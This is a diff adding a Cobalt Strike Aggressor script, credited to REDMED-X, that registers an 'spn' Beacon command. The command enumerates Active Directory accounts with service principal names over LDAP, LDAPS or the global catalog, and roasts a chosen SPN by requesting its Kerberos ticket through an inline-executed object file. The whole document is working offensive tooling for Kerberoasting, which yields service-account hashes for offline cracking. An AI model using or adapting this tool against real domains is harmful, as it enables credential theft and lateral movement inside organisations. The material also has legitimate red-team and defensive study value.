@@ -1,0 +1,83 @@
+# author REDMED-X
+
+beacon_command_register(
+	"spn", "Targeted Kerberoasting with separate enumeration and roasting argument flows.",
+	"INFO:\nEnumerate SPNs via multi-protocol discovery (ldap, ldaps, forest-wide gc) or Roast a specific SPN.\n\n" .
+	"USAGE:\n" .
+	"   spn enum <ldap|ldaps|gc> <target> <dc>\n" .
+	"   spn roast <target>\n\n" .
+	"ARGUMENTS:\n" .
+	"   [enum|roast]     The operation to perform.\n" .
+	"   [ldap|ldaps|gc]  (Only for enum) Protocol type: 'ldap' (389), 'ldaps' (636), or 'gc' (3268).\n" .
+	"   [target]         For 'enum': Partial account name (use \"\" for all). For 'roast': Full SPN string.\n" .
+	"   [dc]             (Only for enum) IP or Hostname of the specific Domain Controller.\n\n" .
+	"EXAMPLES:\n" .
+	"   spn enum gc \"\" DC01.example.local\n" .
+	"   spn enum ldaps sql DC01.example.local\n" .
+	"   spn roast MSSQLSvc/sql01.example.local:1433\n\n"); 
+
+alias spn {
+    local('$bid $action $protocol $target $dc $handle $data $arg_data');
+    $bid    = $1;
+    $action = $2;
+
+    # 1. Base validation check for action
+    if ($action eq "") {
+        berror($bid, "Usage:\n   spn enum <ldap|ldaps|gc> <target> <dc>\n   spn roast <target>");
+        return;
+    }
+
+    if ($action !in @("enum", "roast")) {
+        berror($bid, "Invalid action: \"" . $action . "\". Use \"enum\" or \"roast\".");
+        return;
+    }
+
+    # 2. Branch argument processing based on logical operation
+    if ($action eq "enum") {
+        $protocol = $3;
+        $target   = $4; # Can be passed as "" for all
+        $dc       = $5;
+
+        # Validate that all required enumeration arguments are present
+        if ($protocol eq "" || $dc eq "") {
+            berror($bid, "Usage: spn enum <ldap|ldaps|gc> <target> <dc>\nNote: You can pass \"\" for <target> to return all accounts.");
+            return;
+        }
+
+        # Validate Protocol selection
+        if ($protocol !in @("ldap", "ldaps", "gc")) {
+            berror($bid, "Invalid protocol: \"" . $protocol . "\". Use \"ldap\", \"ldaps\", or \"gc\".");
+            return;
+        }
+
+        # Pack arguments matching the C code 'enum' layout expectation: action, protocol, target, dc
+        $arg_data = bof_pack($bid, "ZZZZ", $action, $protocol, $target, $dc);
+
+        if ($target eq "") {
+            blog($bid, "Tasked Beacon to enumerate ALL accounts with SPNs on $dc via $protocol");
+        } else {
+            blog($bid, "Tasked Beacon to search for SPNs matching accounts * $+ $target $+ * on $dc via $protocol");
+        }
+
+    } else if ($action eq "roast") {
+        $target = $3;
+
+        # Validate that the target SPN was supplied
+        if ($target eq "") {
+            berror($bid, "Usage: spn roast <target>");
+            return;
+        }
+
+        # Pack arguments matching the C code 'roast' layout expectation: action, target
+        $arg_data = bof_pack($bid, "ZZ", $action, $target);
+
+        blog($bid, "Tasked Beacon to request a Kerberos ticket for SPN: $target");
+    }
+
+    # 3. Read and execute the object file
+    $handle = openf(script_resource("spn.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
